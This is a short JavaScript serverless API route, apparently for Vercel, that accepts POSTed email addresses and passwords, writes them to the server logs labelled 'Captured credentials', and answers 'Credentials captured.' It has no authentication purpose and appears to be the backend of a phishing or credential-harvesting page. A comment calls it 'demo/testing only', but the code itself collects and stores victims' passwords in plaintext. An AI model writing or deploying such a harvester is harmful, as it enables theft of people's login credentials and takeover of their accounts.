export default function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;
    // Log credentials to Vercel logs (for demo/testing only)
    console.log('Captured credentials:', { email, password });
    res.status(200).json({ status: 'success', message: 'Credentials captured.' });
  } else {
    res.status(405).json({ status: 'error', message: 'Method not allowed.' });
  }
} 